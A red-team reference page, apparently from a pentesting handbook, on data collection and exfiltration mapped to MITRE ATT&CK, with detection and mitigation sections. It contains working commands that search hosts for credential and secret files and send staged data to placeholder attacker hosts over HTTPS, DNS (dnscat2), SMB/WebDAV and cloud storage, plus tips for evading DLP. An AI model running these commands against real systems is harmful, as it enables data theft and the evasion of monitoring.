% Filename: 06-red-teaming/operations/exfiltration.md
% Display name: Exfiltration
% Last update: 2026-02-11
% ATT&CK Tactics: TA0009 (Collection), TA0010 (Exfiltration)
% ATT&CK Techniques: T1041 (Exfiltration Over C2 Channel), T1048 (Exfiltration Over Alternative Protocol)
% Authors: @TristanInSec

# Exfiltration

## Overview

Data exfiltration is often the primary objective of a red team engagement — demonstrating that an attacker can access and extract sensitive data. The red team must first identify and collect target data (collection), then move it out of the network (exfiltration) while evading DLP and monitoring controls. In real engagements, prove access without actually extracting sensitive data when possible.

## ATT&CK Mapping

- **Tactics:** TA0009 - Collection, TA0010 - Exfiltration
- **Techniques:**
  - T1041 - Exfiltration Over C2 Channel
  - T1048 - Exfiltration Over Alternative Protocol

## Techniques

### Data Discovery and Collection

Identify high-value data before exfiltrating:

```cmd
:: Search for sensitive files on Windows
dir /s /b C:\Users\*.xlsx C:\Users\*.docx C:\Users\*.pdf C:\Users\*.csv
dir /s /b C:\Users\*password* C:\Users\*credential* C:\Users\*secret*

:: Search network shares
dir /s /b \\fileserver\share\*confidential* \\fileserver\share\*sensitive*
```

```powershell
# PowerShell — search for keywords in files
Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.docx,*.xlsx | Select-String -Pattern "password|secret|api.key" -List
```

```bash
# Linux — search for sensitive files
find / -name "*.conf" -o -name "*.env" -o -name "*.key" -o -name "*.pem" 2>/dev/null
grep -rl "password\|api_key\|secret" /home/ /opt/ /var/ 2>/dev/null
```

### Stage Data

Compress and prepare data before exfiltration:

```cmd
:: Windows — compress with PowerShell
powershell Compress-Archive -Path C:\loot\ -DestinationPath C:\Windows\Temp\update.zip

:: Split large files
powershell -c "$f=[IO.File]::ReadAllBytes('C:\loot\data.zip'); for($i=0;$i -lt $f.Length;$i+=1MB){[IO.File]::WriteAllBytes(\"C:\Windows\Temp\part$($i/1MB).bin\",$f[$i..([Math]::Min($i+1MB-1,$f.Length-1))])}"
```

```bash
# Linux — compress and split
tar czf /tmp/data.tar.gz /path/to/loot/
split -b 1M /tmp/data.tar.gz /tmp/part_
```

### Exfiltration Over C2 Channel

The simplest method — send data back through the existing C2 connection:

```bash
# Sliver / Cobalt Strike / Havoc
# Use the built-in download command in your C2 session
download C:\Windows\Temp\data.zip

# Advantage: No new connections, blends with existing C2 traffic
# Disadvantage: Slow for large files, may trigger data volume alerts
```

### Exfiltration Over HTTPS

```bash
# Upload to attacker-controlled web server
curl -X POST -F "file=@/tmp/data.tar.gz" https://<attacker_domain>/upload

# PowerShell — upload via HTTP POST
powershell -c "(New-Object Net.WebClient).UploadFile('https://<attacker>/upload','C:\Temp\data.zip')"
```

### Exfiltration Over DNS

Encode data in DNS queries — bypasses many network controls:

```bash
# Encode file as base64, split into DNS-length chunks, send as subdomains
# Each DNS label limited to 63 chars, total query 253 chars

# Using dnscat2 (attacker)
# dnscat2
# https://github.com/iagox86/dnscat2
ruby dnscat2.rb <attacker_domain>

# Using dnscat2 (target)
./dnscat <attacker_domain>
```

### Exfiltration Over SMB/WebDAV

```cmd
:: Copy to attacker-controlled SMB share
copy C:\loot\data.zip \\<attacker_ip>\share\

:: WebDAV
copy C:\loot\data.zip \\<attacker_ip>@SSL\DavWWWRoot\share\
```

### Exfiltration Over Cloud Services

Use legitimate cloud services to blend in:

```powershell
# Upload to cloud storage APIs (Azure Blob, S3, etc.)
# Uses HTTPS to legitimate cloud domains — hard to distinguish from normal traffic
Invoke-WebRequest -Uri "https://<storage_account>.blob.core.windows.net/container/data.zip" -Method PUT -InFile "C:\Temp\data.zip" -Headers @{"x-ms-blob-type"="BlockBlob"}
```

### OPSEC Considerations for Exfiltration

```text
- Encrypt data before exfiltration (AES, GPG)
- Exfiltrate during business hours to blend with normal traffic
- Throttle transfer rate to avoid bandwidth alerts
- Use protocols already in the environment (HTTPS, DNS, SMB)
- Split large transfers across multiple sessions
- In red team engagements: prove access with screenshots rather than
  extracting actual sensitive data when possible
```

## Detection Methods

### Network-Based Detection

- DLP systems inspecting outbound traffic for sensitive patterns (SSN, credit card, keywords)
- Unusual DNS query volume or long subdomain labels (DNS exfil)
- Large outbound data transfers to new or uncategorized domains
- Encrypted uploads to cloud storage from servers that don't normally do this

### Host-Based Detection

- File compression and archiving activity (zip, tar, 7z) on sensitive directories
- PowerShell or cmd accessing large numbers of files in a short period
- Staging files in temporary directories before transfer

## Mitigation Strategies

- **DLP deployment** — inspect outbound HTTPS, email, and cloud uploads for sensitive content
- **DNS monitoring** — detect anomalous DNS query patterns (volume, length, entropy)
- **Egress filtering** — restrict outbound connections to approved destinations
- **Cloud access security broker (CASB)** — monitor and control cloud storage uploads
- **Network segmentation** — limit which systems can make outbound connections

## References

### MITRE ATT&CK

- [T1041 - Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
- [T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
